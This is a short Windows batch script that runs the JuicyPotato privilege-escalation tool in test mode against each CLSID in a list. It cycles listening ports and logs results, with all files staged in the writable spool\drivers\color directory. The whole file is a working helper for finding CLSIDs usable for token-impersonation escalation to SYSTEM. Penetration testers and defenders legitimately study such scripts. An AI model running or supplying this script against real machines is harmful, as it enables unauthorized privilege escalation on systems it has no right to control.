@echo off
:: Starting port, you can change it
set /a port=10000
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (c:\windows\system32\spool\drivers\color\CLSID.list) DO (
   echo %%i !port!
   c:\windows\system32\spool\drivers\color\juicypotato.exe -z -l !port! -c %%i >> c:\windows\system32\spool\drivers\color\result.log
   set RET=!ERRORLEVEL!
   :: echo !RET!
   if "!RET!" == "1"  set /a port=port+1
)
